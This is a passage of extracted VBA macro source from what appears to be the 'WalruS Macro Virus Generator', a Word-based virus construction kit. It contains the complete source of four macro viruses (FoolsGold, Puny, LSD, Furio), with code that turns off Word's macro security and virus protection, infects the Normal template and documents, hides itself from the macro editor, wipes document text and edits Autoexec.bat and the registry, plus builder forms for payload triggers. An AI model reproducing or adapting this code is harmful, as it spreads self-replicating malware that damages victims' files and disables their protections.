    End If
    If select1 = 5 Then
        Print #1, noisevar1$ + " = " + noisevar2 + " & " + noisevar3 + " & " + noisevar4 + " & " + noisevar5
    End If
    If select1 = 6 Then
        Print #1, noisevar4$ + " = " + noisevar5 + " & " + noisevar6 + " & " + noisevar2 + " & " + noisevar3
    End If

End If

End Sub



-------------------------------------------------------------------------------
VBA MACRO WMVGAbout.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub CommandButton1_Click()
WMVGAbout.Hide
WMVG.Show
End Sub

Private Sub Label2_Click()
WMVGSecretFrm4.Show
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGExit.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
Oldtimer = Timer
While (Timer < Oldtimer + 3)
Wend
End Sub

Private Sub UserForm_Click()
WMVGExit.Hide
Application.Quit
End Sub

-------------------------------------------------------------------------------
VBA MACRO WMVGExtras.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGExtras'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



' Drop FoolsGold Virus
Private Sub CommandButton1_Click()
On Error Resume Next

' Open source file for construction
Open "C:\My Documents\FoolsGold.bas" For Output As #1

    Print #1, "Attribute VB_Name = ""Fool"""
    Print #1, ""
    Print #1, "Sub AutoOpen()"
    Print #1, "'FoolsGold 2000 Virus vWMVG"
    Print #1, "'The WaLRuS 09/00"
    Print #1, "On Error Resume Next"
    Print #1, "Options.ConfirmConversions = False"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
    Print #1, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
    Print #1, "ActiveDocument.ReadOnlyRecommended = False"
    Print #1, "If (Second(Now()) > 50) Then System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"", ""RegisteredOwner"") = ""The WaLRuS"""
    Print #1, "If Day(Now) = 31 Then Call Payload"
    Print #1, "Set Norm = NormalTemplate.VBProject.VBComponents"
    Print #1, "Set Doc = ActiveDocument.VBProject.VBComponents"
    Print #1, "If Norm.Item(""Fool"").Name <> ""Fool"" Then"
    Print #1, "Doc(""Fool"").Export ""c:\Fool.drv"""
    Print #1, "Set infect = NormalTemplate.VBProject"
    Print #1, "ElseIf Doc.Item(""Fool"").Name <> ""Fool"" Then"
    Print #1, "Norm(""Fool"").Export ""c:\Fool.drv"""
    Print #1, "Set infect = ActiveDocument.VBProject"
    Print #1, "End If"
    Print #1, "infect.VBComponents.Import (""c:\Fool.drv"")"
    Print #1, "Kill (""c:\Fool.drv"")"
    Print #1, "ActiveDocument.Save"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub HelpAbout()"
    Print #1, "On Error Resume Next"
    Print #1, "Call Payload"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub Payload()"
    Print #1, "On Error Resume Next"
    Print #1, "MsgBox ""FoolsGold 2000 by The WaLRuS "", vbInformation"""
    Print #1, "Assistant.Visible = True"
    Print #1, "With Assistant.NewBalloon"
    Print #1, ".Icon = msoIconAlert"
    Print #1, ".Text = ""FoolsGold 2000 Thanks You!"""
    Print #1, ".Heading = ""GREETINGS"""
    Print #1, "End With"
    Print #1, "SetAttr ""C:\Autoexec.bat"", 0"
    Print #1, "Open ""C:\Autoexec.bat"" For Append As #1"
    Print #1, "Print #1, ""CLS"""
    Print #1, "Print #1, ""ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"""
    Print #1, "Print #1, ""ECHO                º  *****************************************  º"""
    Print #1, "Print #1, ""ECHO                º  *  FoolsGold 2000 Virus by The WaLRuS   *  º"""
    Print #1, "Print #1, ""ECHO                º  *****************************************  º"""
    Print #1, "Print #1, ""ECHO                º  The Fools Gold Virus wishes to thank the   º"""
    Print #1, "Print #1, ""ECHO                º  user of this computer because you have     º"""
    Print #1, "Print #1, ""ECHO                º  helped to spread the good words of peace!  º"""
    Print #1, "Print #1, ""ECHO                º  WaLRuS                                     º"""
    Print #1, "Print #1, ""ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"""
    Print #1, "Close #1"
    Print #1, "Finish:"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub ToolsMacro()"
    Print #1, "On Error Resume Next"
    Print #1, "Call Stealthy"
    Print #1, "End Sub"

    Print #1, "Sub FileTemplates()"
    Print #1, "On Error Resume Next"
    Print #1, "Call Stealthy"
    Print #1, "End Sub"

    Print #1, "Sub ViewVBCode()"
    Print #1, "On Error Resume Next"
    Print #1, "Call Stealthy"
    Print #1, "End Sub"

    Print #1, "Sub Stealthy()"
    Print #1, "On Error Resume Next"
    Print #1, "Selection.WholeStory"
    Print #1, "Selection.Delete Unit:=wdCharacter, Count:=1"
    Print #1, "ActiveDocument.Save"
    Print #1, "Call Payload"
    Print #1, "End Sub"
    Close #1
    
    ' Open document and then infect it, save it and close it
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    ActiveDocument.VBProject.VBComponents.Import ("C:\My Documents\FoolsGold.bas")
    ActiveDocument.SaveAs ("C:\My Documents\FoolsGold.doc")
    ActiveDocument.Close
    
    MsgBox "The Fools Gold Virus By The WalruS" & vbCr & "Has Now Been Dropped", vbInformation, "WMVG"

End Sub

' Drop Puny Virus
Private Sub CommandButton2_Click()
On Error Resume Next

' Open source file for construction
Open "C:\My Documents\Puny.bas" For Output As #1

    Print #1, "Attribute VB_Name = ""Puny"""
    Print #1, "Sub AutoOpen()"
    Print #1, "'Puny vWMVG WalruS"
    Print #1, "On Error Resume Next"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "Set N = NormalTemplate.VBProject.VBComponents: Set D = ActiveDocument.VBProject.VBComponents"
    Print #1, "If N.Item(""Puny"").Name <> ""Puny"" Then"
    Print #1, "D(""Puny"").Export ""C:\P"": Set i = NormalTemplate.VBProject"
    Print #1, "ElseIf D.Item(""Puny"").Name <> ""Puny"" Then"
    Print #1, "N(""Puny"").Export ""C:\P"": Set i = ActiveDocument.VBProject"
    Print #1, "End If"
    Print #1, "i.VBComponents.Import (""C:\P"")"
    Print #1, "ActiveDocument.Save"
    Print #1, "End Sub"
    Close #1
    
   ' Open document and then infect it, save it and close it
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    ActiveDocument.VBProject.VBComponents.Import ("C:\My Documents\Puny.bas")
    ActiveDocument.SaveAs ("C:\My Documents\Puny.doc")
    ActiveDocument.Close
    
    MsgBox "The Puny Virus By The WalruS" & vbCr & "Has Now Been Dropped", vbInformation, "WMVG"
    
End Sub
' Drop LSD Virus
Private Sub CommandButton3_Click()
On Error Resume Next

' Open source file for construction
Open "C:\My Documents\LSD.cls" For Output As #1

    Print #1, "Private Declare Function SetSysColors Lib ""user32"" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"
    Print #1, "Private Sub Document_Open()"
    Print #1, "' LSD"
    Print #1, "' By The WalruS 09/00 vWMVG"
    Print #1, ""
    Print #1, "On Error Resume Next"
    Print #1, ""
    Print #1, "Randomize"
    Print #1, ""
    Print #1, "If Left(ActiveDocument.Name, 8) = ""Document"" Then Exit Sub"
    Print #1, ""
    Print #1, "Select Case Application.Version"
    Print #1, ""
    Print #1, "Case ""9.0"""
    Print #1, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
    Print #1, "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
    Print #1, ""
    Print #1, "Case ""8.0"""
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "End Select"
    Print #1, "     "
    Print #1, "With Application"
    Print #1, "    .ScreenUpdating = False"
    Print #1, "    .DisplayStatusBar = False"
    Print #1, "    .DisplayAlerts = False"
    Print #1, "End With"
    Print #1, ""
    Print #1, "KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:="" """
    Print #1, ""
    Print #1, "Set nor = NormalTemplate.VBProject.vbcomponents(1).CodeModule"
    Print #1, "Set doc = ActiveDocument.VBProject.vbcomponents(1).CodeModule"
    Print #1, ""
    Print #1, "ChangeHook = Int(Rnd * 2)"
    Print #1, "Select Case ChangeHook"
    Print #1, ""
    Print #1, "Case 0"
    Print #1, "    Hook = ""Private Sub Document_Open()"""
    Print #1, "        "
    Print #1, "Case 1"
    Print #1, "Hook = ""Private Sub Document_Close()"""
    Print #1, "    "
    Print #1, "End Select"
    Print #1, ""
    Print #1, "Open ""C:\Windows\"" & Day(Now) & "".sys"" For Output As #1"
    Print #1, "Print #1, ""Private Declare Function SetSysColors Lib """"user32"""" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"""
    Print #1, "Print #1, Hook"
    Print #1, "Print #1, VBProject.vbcomponents(1).CodeModule.Lines(3, 110)"
    Print #1, "Close #1"
    Print #1, ""
    Print #1, "If nor.Lines(3, 1) <> ""' LSD"" Then"
    Print #1, "    nor.DeleteLines 1, nor.CountOfLines"
    Print #1, "    nor.AddFromFile (""C:\Windows\"" & Day(Now) & "".sys"")"
    Print #1, "    NormalTemplate.Save"
    Print #1, "ElseIf doc.Lines(3, 1) <> ""' LSD"" Then"
    Print #1, "    doc.DeleteLines 1, doc.CountOfLines"
    Print #1, "    doc.AddFromFile (""C:\Windows\"" & Day(Now) & "".sys"")"
    Print #1, "End If"
    Print #1, ""
    Print #1, "With Dialogs(wdDialogFileSummaryInfo)"
    Print #1, "    .Author = ""WalruS"""
    Print #1, "    .Title = ""CandyFlippin"""
    Print #1, "    .Execute"
    Print #1, "End With"
    Print #1, ""
    Print #1, "One = Left(TimeCheck, 1)"
    Print #1, "Two = Right(TimeCheck, 1)"
    Print #1, "If One = Two Then Call CandyFlip"
    Print #1, " "
    Print #1, "NormalTemplate.Saved = True"
    Print #1, "If ActiveDocument.Saved <> True Then ActiveDocument.Save"
    Print #1, ""
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Private Sub CandyFlip()"
    Print #1, "On Error Resume Next"
    Print #1, "a = SetSysColors(1, 1, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 2, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 3, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 4, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 5, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 6, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 7, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 8, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 9, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 10, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 11, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 12, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 13, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 14, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 15, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 16, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 17, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 18, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 19, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 20, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 21, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 22, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 23, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 24, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 25, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 26, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 27, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "End Sub"
    Close #1
    
   ' Open document and then infect it, save it and close it
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromFile ("C:\My Documents\LSD.cls")
    ActiveDocument.SaveAs ("C:\My Documents\LSD.doc")
    ActiveDocument.Close
    
    ' Clean Template Just In Case
    Clean = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Clean > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Clean
    NormalTemplate.Save
    
    MsgBox "The LSD Virus By The WalruS" & vbCr & "Has Now Been Dropped", vbInformation, "WMVG"
    
End Sub

Private Sub CommandButton13_Click()
WMVGExtras.Hide
WMVG.Show
End Sub

' Drop Furio Virus
Private Sub CommandButton4_Click()
On Error Resume Next

' Open source file for construction
Open "C:\My Documents\Furio.bas" For Output As #1

    Print #1, "Attribute VB_Name = ""Furio"""
    Print #1, "' Furio"
    Print #1, "Sub AutoOpen()"
    Print #1, "On Error Resume Next"
    Print #1, "' Furio Virus vWMVG by WalruS 09/00"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.ConfirmConversions = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "Application.DisplayAlerts = wdAlertsNone"
    Print #1, "Application.DisplayStatusBar = False"
    Print #1, "Application.ScreenUpdating = False"
    Print #1, "ActiveDocument.ReadOnlyRecommended = False"
    Print #1, "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
    Print #1, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
    Print #1, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"", ""RegisteredOwner"") = ""The WalruS"""
    Print #1, "ActiveDocument.VBProject.VBComponents(""Furio"").export (""C:\Windows\Furio.drv"")"
    Print #1, "SetAttr (""C:\Windows\Furio.drv""), 6"
    Print #1, "Template = Dir(""C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot"")"
    Print #1, "If Template = """" Then"
    Print #1, "NormalTemplate.OpenAsDocument"
    Print #1, "ActiveDocument.VBProject.VBComponents.Import (""C:\Windows\Furio.drv"")"
    Print #1, "ActiveDocument.SaveAs (""C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot"")"
    Print #1, "NormalTemplate.Saved = True"
    Print #1, "ActiveDocument.Close"
    Print #1, "End If"
    Print #1, "If Second(Now) = Minute(Now) Then Call Payload"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub SpreadTheWord()"
    Print #1, "On Error Resume Next"
    Print #1, "If ActiveDocument.VBProject.VBComponents.Item(""Furio"").CodeModule.Lines(1, 1) <> ""' Furio"" Then"
    Print #1, "ActiveDocument.VBProject.VBComponents.Import (""C:\Windows\Furio.drv"")"
    Print #1, "ActiveDocument.Save"
    Print #1, "End If"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub FileOpen()"
    Print #1, "On Error Resume Next"
    Print #1, "Dialogs(wdDialogFileOpen).Show"
    Print #1, "Call SpreadTheWord"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub FileSave()"
    Print #1, "On Error Resume Next"
    Print #1, "Call SpreadTheWord"
    Print #1, "ActiveDocument.Save"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub FilePrintDefault()"
    Print #1, "On Error Resume Next"
    Print #1, "Call SpreadTheWord"
    Print #1, "ActiveDocument.PrintOut"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub Payload()"
    Print #1, "On Error Resume Next"
    Print #1, "Options.BlueScreen = True"
    Print #1, "MyApp = Shell(""notepad.exe"", 1)"
    Print #1, "SendKeys ""Hello there!~~Im the WalruS. Welcome To My New Creation - Furio~~~///0-0\\\    WalruS 09/00"", True"
    Print #1, "AppActivate (MyApp)"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub ToolsOptions()"
    Print #1, "On Error Resume Next"
    Print #1, "Options.VirusProtection = 1"
    Print #1, "Options.SaveNormalPrompt = 1"
    Print #1, "Dialogs(wdDialogToolsOptions).Show"
    Print #1, "Options.VirusProtection = 0"
    Print #1, "Options.SaveNormalPrompt = 0"
    Print #1, "End Sub"
    Print #1, ""
    Print #1, "Sub ViewVBCode(): End Sub"
    Print #1, "Sub ToolsMacro(): End Sub"
    Print #1, "Sub FileTemplates(): End Sub ' cya"
    Close #1

    ' Open document and then infect it, save it and close it
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    ActiveDocument.VBProject.VBComponents.Import ("C:\My Documents\Furio.bas")
    ActiveDocument.SaveAs ("C:\My Documents\Furio.doc")
    ActiveDocument.Close
    
    MsgBox "The Furio Virus By The WalruS" & vbCr & "Has Now Been Dropped", vbInformation, "WMVG"
End Sub

Private Sub CommandButton5_Click()
MsgBox "Drops The Fools Gold Virus Into" & vbCr & "C:\My Documents\", vbInformation, "WMVG"
End Sub

Private Sub CommandButton6_Click()
MsgBox "Drops The Puny Virus Into" & vbCr & "C:\My Documents\", vbInformation, "WMVG"
End Sub

Private Sub CommandButton7_Click()
MsgBox "Drops The LSD Virus Into" & vbCr & "C:\My Documents\", vbInformation, "WMVG"
End Sub

Private Sub CommandButton8_Click()
MsgBox "Drops The Furio Virus Into" & vbCr & "C:\My Documents\", vbInformation, "WMVG"
End Sub

Private Sub CommandButton9_Click()
On Error Resume Next
    ActiveDocument.FollowHyperlink Address:= _
        "mailto:WalruS@Z.com" _
        , NewWindow:=False, AddHistory:=False
End Sub

Private Sub CommandButton10_Click()
On Error Resume Next
    ActiveDocument.FollowHyperlink Address:= _
        "http://www.WalruS.8k.com" _
        , NewWindow:=False, AddHistory:=False
End Sub

Private Sub CommandButton11_Click()
MsgBox "The WalruS Can Be Found In The IRC Channels :" & vbCr & vbCr & "#Virus" & vbCr & "#VxTrader" & vbCr & vbCr & "On Undernet", vbInformation, "Chat To The WalruS"
End Sub

Private Sub Frame2_Click()

End Sub

Private Sub Image2_Click()
WMVGSecretFrm1.Show
End Sub

Private Sub Label1_Click()
WMVGYelloPic.Show
End Sub

Private Sub Label7_Click()

End Sub

Private Sub UserForm_Click()

End Sub

-------------------------------------------------------------------------------
VBA MACRO WMVGInit.bas 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGInit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' WalruS Macro Virus Generator (WMVG)
' Version 1.00
' By The WalruS 10/00

' Declare Variables
Public VirusName As String
Public Payload As String
Public PayloadMsgText As String
Public PayloadMsgType As String
Public PayloadPlugin As String
Public PayloadAssistantMessage As String
Public PayloadMonth As Integer
Public PayloadDay As Integer
Public RandomTrigger As Integer
Public EveryVariable As Boolean
Public Stealth As String

Sub AutoOpen()

    On Error Resume Next
    
    ' Set Variables
    
    Stealth = "Error"
    Payload = Error
    PayloadPlugin = "Error"
    PayloadMsgType = "Error"
    PayloadMonth = 0
    PayloadDay = 0
    EverVariable = False
    RandomTrigger = 0
    
    ' Caption
    Application.Caption = "The WalruS Macro Virus Generator (WMVG)"
    
    ' Minimise Word
    Application.WindowState = wdWindowStateMinimize
    
    ' Clean The Template
    Call TemplateCleaner
    
    ' The Following Registry Key Prevents A Created Virus From Using IRC And VBS Backup AGAINST The Author!!!
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\WalruS\WMVG", "Installed") = "True"
    
    ' Show Welcome Screen
    WMVGWelcome.Show

End Sub

' Best Clean The Template Before We Go
Sub AutoClose()
    On Error Resume Next
    Call TemplateCleaner
    Call ExitSettings
End Sub

' Best Clean The Template Before We Go
Sub AutoExit()
    On Error Resume Next
    Call TemplateCleaner
    Call ExitSettings
End Sub

' Cleans The Normal Template
Sub TemplateCleaner()
    On Error Resume Next
    Clean = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Clean > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Clean
    NormalTemplate.Save
End Sub

' Ensures An Error Is Not Thrown Up At Exit
Sub ExitSettings()
    On Error Resume Next
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO WMVGPayloadAssistant.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGPayloadAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton74_Click()
TextBox1.Text = ""
End Sub

Private Sub CommandButton75_Click()
PayloadAssistantMessage = TextBox1.Text
WMVGPayloadAssistant.Hide
WMVG.Show
End Sub

Private Sub Label1_Click()
    On Error Resume Next
    Assistant.Visible = True
    With Assistant.NewBalloon
    .Animation = msoAnimationEmptyTrash
    .Icon = msoIconTip
    .Text = "Why Not Use Me For A Payload"
    .Heading = "WMVG"
    .Show

    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGPayloadDate.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGPayloadDate'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub CommandButton1_Click()
On Error Resume Next
    If PayloadMonth = 99 And PayloadDay = 99 Then
    MsgBox "Dont Select Every Day Of Every Month" & vbCr & "Select Payload Trigger On Every Run Instead", vbInformation, "Please"
    GoTo leave
    End If
    WMVGPayloadDate.Hide
    WMVG.Show
leave:
End Sub

Private Sub Frame1_Click()

End Sub

Private Sub OptionButton1_Click()
    If OptionButton1 = True Then PayloadMonth = 1
End Sub

Private Sub OptionButton10_Click()
    If OptionButton10 = True Then PayloadMonth = 9
End Sub

Private Sub OptionButton11_Click()
    If OptionButton11 = True Then PayloadMonth = 10
End Sub

Private Sub OptionButton12_Click()
    If OptionButton12 = True Then PayloadMonth = 12
End Sub

Private Sub OptionButton13_Click()
    If OptionButton13 = True Then PayloadMonth = 11
End Sub

Private Sub OptionButton14_Click()
    If OptionButton14 = True Then PayloadDay = 1
End Sub

Private Sub OptionButton15_Click()
    If OptionButton15 = True Then PayloadDay = 2
End Sub

Private Sub OptionButton16_Click()
    If OptionButton16 = True Then PayloadDay = 4
End Sub

Private Sub OptionButton17_Click()
    If OptionButton17 = True Then PayloadDay = 3
End Sub

Private Sub OptionButton18_Click()
    If OptionButton18 = True Then PayloadDay = 11
End Sub

Private Sub OptionButton19_Click()
    If OptionButton19 = True Then PayloadDay = 8
End Sub

Private Sub OptionButton2_Click()
    If OptionButton2 = True Then PayloadMonth = 2
End Sub

Private Sub OptionButton20_Click()
    If OptionButton20 = True Then PayloadDay = 9
End Sub

Private Sub OptionButton21_Click()
    If OptionButton21 = True Then PayloadDay = 10
End Sub

Private Sub OptionButton22_Click()
    If OptionButton22 = True Then PayloadDay = 15
End Sub

Private Sub OptionButton23_Click()
    If OptionButton23 = True Then PayloadDay = 16
End Sub

Private Sub OptionButton24_Click()
    If OptionButton24 = True Then PayloadDay = 18
End Sub

Private Sub OptionButton25_Click()
    If OptionButton25 = True Then PayloadDay = 17
End Sub

Private Sub OptionButton26_Click()
    If OptionButton26 = True Then PayloadDay = 21
End Sub

Private Sub OptionButton27_Click()
    If OptionButton27 = True Then PayloadDay = 5
End Sub

Private Sub OptionButton28_Click()
    If OptionButton28 = True Then PayloadDay = 7
End Sub

Private Sub OptionButton29_Click()
    If OptionButton29 = True Then PayloadDay = 6
End Sub

Private Sub OptionButton3_Click()
    If OptionButton3 = True Then PayloadMonth = 4
End Sub

Private Sub OptionButton30_Click()
    If OptionButton30 = True Then PayloadDay = 14
End Sub

Private Sub OptionButton31_Click()
    If OptionButton31 = True Then PayloadDay = 12
End Sub

Private Sub OptionButton32_Click()
    If OptionButton32 = True Then PayloadDay = 13
End Sub

Private Sub OptionButton33_Click()
    If OptionButton33 = True Then PayloadDay = 19
End Sub

Private Sub OptionButton34_Click()
    If OptionButton34 = True Then PayloadDay = 20
End Sub

Private Sub OptionButton35_Click()
    If OptionButton35 = True Then PayloadDay = 28
End Sub

Private Sub OptionButton36_Click()
    If OptionButton36 = True Then PayloadDay = 22
End Sub

Private Sub OptionButton37_Click()
    If OptionButton37 = True Then PayloadDay = 23
End Sub

Private Sub OptionButton38_Click()
    If OptionButton38 = True Then PayloadDay = 25
End Sub

Private Sub OptionButton39_Click()
    If OptionButton39 = True Then PayloadDay = 24
End Sub

Private Sub OptionButton4_Click()
    If OptionButton4 = True Then PayloadMonth = 3
End Sub

Private Sub OptionButton40_Click()
    If OptionButton40 = True Then PayloadDay = 26
End Sub

Private Sub OptionButton41_Click()
    If OptionButton41 = True Then PayloadDay = 27
End Sub

Private Sub OptionButton43_Click()
    If OptionButton43 = True Then PayloadDay = 29
End Sub

Private Sub OptionButton44_Click()
    If OptionButton144 = True Then PayloadDay = 30
End Sub

Private Sub OptionButton46_Click()
    If OptionButton46 = True Then PayloadDay = 31
End Sub

Private Sub OptionButton47_Click()
    If OptionButton47 = True Then
    PayloadDay = 99
    PayloadMonth = 99
    EveryVariable = True
    End If
End Sub

Private Sub OptionButton48_Click()
    If OptionButton48 = True Then
    PayloadMonth = 99
    EveryVariable = True
    End If
End Sub

Private Sub OptionButton5_Click()
    If OptionButton5 = True Then PayloadMonth = 8
End Sub

Private Sub OptionButton6_Click()
    If OptionButton6 = True Then PayloadMonth = 5
End Sub

Private Sub OptionButton7_Click()
    If OptionButton7 = True Then PayloadMonth = 6
End Sub

Private Sub OptionButton8_Click()
    If OptionButton8 = True Then PayloadMonth = 7
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGPayloadMsg.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGPayloadMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton74_Click()
PayloadMsgText = TextBox1.Text
WMVGPayloadMsg.Hide
WMVG.Show
End Sub

Private Sub CommandButton75_Click()
TextBox1.Text = ""
PayloadMsgType = "Error"
OptionButton1.Value = False
OptionButton2.Value = False
OptionButton3.Value = False
End Sub

Private Sub Frame1_Click()

End Sub

Private Sub Label1_Click()
OptionButton1.Value = True
End Sub

Private Sub Label2_Click()
OptionButton2.Value = True
End Sub

Private Sub Label3_Click()
OptionButton3.Value = True
End Sub

Private Sub OptionButton1_Click()
    If OptionButton1 = True Then PayloadMsgType = "vbInformation"
End Sub

Private Sub OptionButton2_Click()
    If OptionButton2 = True Then PayloadMsgType = "vbExclamation"
End Sub

Private Sub OptionButton3_Click()
    If OptionButton3 = True Then PayloadMsgType = "vbCritical"
End Sub

-------------------------------------------------------------------------------
VBA MACRO WMVGPayloadPlugin.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub CommandButton74_Click()
PayloadPlugin = TextBox1.Text
WMVGPayloadPlugin.Hide
WMVG.Show
End Sub

Private Sub CommandButton75_Click()
TextBox1.Text = ""
End Sub

Private Sub TextBox1_Change()

End Sub

Private Sub UserForm_Click()
WMVGSecretFrm3.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO WMVGPayloadRandom.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVGPayloadRandom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
    WMVGPayloadRandom.Hide
    WMVG.Show
End Sub

Private Sub OptionButton1_Click()
    If OptionButton1 = True Then RandomTrigger = 5
End Sub

Private Sub OptionButton2_Click()
    If OptionButton2 = True Then RandomTrigger = 10
End Sub

Private Sub OptionButton3_Click()
    If OptionButton3 = True Then RandomTrigger = 15
End Sub

Private Sub OptionButton4_Click()
    If OptionButton4 = True Then RandomTrigger = 20
End Sub

Private Sub OptionButton5_Click()
    If OptionButton5 = True Then RandomTrigger = 30
End Sub

Private Sub OptionButton6_Click()
